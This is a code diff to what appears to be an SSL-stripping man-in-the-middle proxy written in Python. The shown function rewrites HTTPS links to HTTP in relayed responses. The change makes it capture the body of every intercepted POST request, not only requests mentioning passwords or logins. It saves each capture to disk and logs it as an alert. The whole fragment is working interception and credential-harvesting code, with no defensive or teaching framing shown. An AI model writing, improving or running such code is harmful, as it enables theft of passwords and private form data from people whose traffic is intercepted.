@@ -49,15 +49,28 @@ def handle_client_connection(client_socket):
                 stripped_response = response_data.replace(b'https://', b'http://')
                 
                 # Log Credentials
-                if b"password" in request_data.lower() or b"login" in request_data.lower():
-                    pkt_id = str(uuid.uuid4())
+                # ... inside handle_client_connection ...
+                if b"POST " in request_data:
+                    # NEW NAMING
+                    timestamp_id = time.strftime('%H%M%S')
+                    clean_host = host.replace('.', '-') if host else "unknown"
+                    pkt_id = f"{timestamp_id}_SSL_{clean_host}"
+
+                    # Try to extract body... (keep existing logic)
+                    try:
+                        header, body = request_data.split(b'\r\n\r\n', 1)
+                        snippet = body.decode('utf-8', errors='ignore')
+                    except:
+                        snippet = request_data[:100].decode('utf-8', errors='ignore')
+
                     with open(f"{CAPTURE_DIR}/{pkt_id}.html", "wb") as f: f.write(request_data)
+                    
                     STATUS["intercepted_data"].append({
                         "id": pkt_id, "time": time.strftime('%H:%M:%S'),
                         "src": "SSL_STRIP", "dst": host,
-                        "snippet": f"[SSL STRIP DATA] {request_data[:100]}", "type": "ALERT"
+                        "snippet": f"[POST] {snippet}", "type": "ALERT"
                     })
-                    log_msg(f"[ALERT] SSL STRIP Creds found for {host}")
+                    log_msg(f"[ALERT] SSL STRIP Data Captured for {host}")
 
                 client_socket.sendall(stripped_response)
     except: pass
